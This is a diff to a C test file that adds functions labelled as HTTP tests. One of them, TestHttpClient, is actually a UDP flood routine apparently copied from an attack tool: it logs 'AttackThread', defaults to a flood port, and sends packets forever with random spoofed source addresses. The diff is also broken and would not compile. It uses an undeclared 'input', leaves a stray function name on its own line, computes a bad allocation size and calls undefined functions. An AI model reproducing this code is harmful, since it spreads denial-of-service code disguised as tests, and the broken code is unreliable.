@@ -10,10 +10,110 @@
  * Test all function.
  */
 
-static int TestHttps(void)
+static size_t TestHttpServer()
 {
-    const char *url = "127.0.0.1:9988";
-    const char *request = "";
+    int listen_socket = ServerTcpCreateSocket(LOCAL_PORT);
+    int client_socket = WaitClient(listen_socket);
+    
+    hanld_client(listen_socket, client_socket);
+    close(listen_socket);
+    return 0;
+}
+
+static size_t TestHttpClient()
+{
+    pUDPStruct udp_struct = (pUDPStruct)malloc(sizeof(UDPStruct));
+    pSplitUrlOutput split_result;
+    int i;
+
+    if (!SplitUrl(input->address, &split_result))
+    {
+        ErrorMessage("AttackThread SplitUrl failed");
+        return 1;
+    }
+    ShowMessage(DEBUG, input->debug_level, "split_reult: %s", split_result->protocol);
+    ShowMessage(DEBUG, input->debug_level, "split_reult: %s", split_result->host);
+    ShowMessage(DEBUG, input->debug_level, "split_reult: %d", split_result->port);
+    ShowMessage(DEBUG, input->debug_level, "split_reult: %s", split_result->suffix);
+    if (split_result->port == 0)
+    {
+        if (strlen(split_result->host) == 0)
+        {
+            ErrorMessage("AttackThread SplitUrl not right");
+            return 1;
+        }
+        // make the port as default
+        split_result->port = UDP_FLOOD_PORT_DEFAULT;
+    }
+    // init the target ip and port
+    udp_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
+    if (!(udp_struct->dst_ip))
+    {
+        ErrorMessage("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
+        return 1;
+    }
+    if (!memset(udp_struct->dst_ip, 0, IP_BUFFER_SIZE))
+    {
+        ErrorMessage("AttackThread memset failed: %s(%d)", strerror(errno), errno);
+        return 1;
+    }
+    if (!strncpy(udp_struct->dst_ip, split_result->host, strlen(split_result->host)))
+    {
+        ErrorMessage("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
+        return 1;
+    }
+    udp_struct->dst_port = split_result->port;
+    FreeSplitUrlBuff(split_result);
+    udp_struct->each_ip_repeat = input->each_ip_repeat;
+
+    ShowMessage(VERBOSE, input->debug_level, "AttackThread start sending data...");
+    for (;;)
+    {
+        if (input->random_sip_address == ENABLE_SIP)
+        {
+            // randome ip and port
+            if (!GetRandomIP(&(udp_struct->src_ip)))
+            {
+                ErrorMessage("AttackThread GetRandomIP failed");
+                return 1;
+            }
+            // this function has no failed
+            GetRandomPort(&(udp_struct->src_port));
+        }
+        else
+        {
+            // use the static ip and port
+            if (!strncpy(udp_struct->src_ip, DEFAULT_ADDRESS, strlen(DEFAULT_ADDRESS)))
+            {
+                ErrorMessage("AttackThread copy SIP_ADDRESS failed: %s(%d)", strerror(errno), errno);
+                return 1;
+            }
+            udp_struct->src_port = (int)DEFAULT_PORT;
+        }
+
+        // rport is random source port
+        for (i = 0; i < input->each_ip_repeat; i++)
+        {
+            if (SendUDP(udp_struct, input->debug_level))
+            {
+                ErrorMessage("AttackThread Attack failed");
+                //return 1;
+            }
+        }
+        FreeRandomIPBuff(udp_struct->src_ip);
+    }
+    FreeUDPStrutBuff(udp_struct);
+    return 0;
+}
+
+static size_t TestHttpSend(void)
+{
+
+    TestHttpServer
+    char *url = (char *)malloc(sizeof(2 * strlen(LOCAL_ADDRESS)));
+    memset(url, 0, sizeof(url));
+    sprintf(url, "%s%d", LOCAL_ADDRESS, LOCAL_PORT);
+    char *request = "";
     char **response;
     size_t send_len = HttpMethod(url, request, response, VERBOSE);
     print("Send data length: %d", send_len);
@@ -48,12 +148,10 @@ static int TestHttps(void)
         return 1;
     }
     pthread_attr_destroy(&attr);
-
     //pthread_detach(tid);
     pthread_join(tid, NULL);
     
-    return 0;
-
+    free(url);
     return 0;
 }
 
@@ -96,7 +194,7 @@ static int TestBase64(void)
             FreeBase64Buffer(encode_result);
             FreeBase64Buffer(decode_result);
             free(plain_text);
-            return 1;
+            return -1;
         }
         FreeBase64Buffer(encode_result);
         FreeBase64Buffer(decode_result);
@@ -109,9 +207,17 @@ static int TestBase64(void)
 int main(int argc, char *argv[])
 {
 
-    TestBase64();
+    if (TestBase64() == -1)
+    {
+        ErrorMessage("test base64 function failed");
+        return -1;
+    }
 
-    Test
+    if (TestHttp() == -1)
+    {
+        ErrorMessage("test http function failed");
+        return -1;
+    }
 
     return 0;
 }
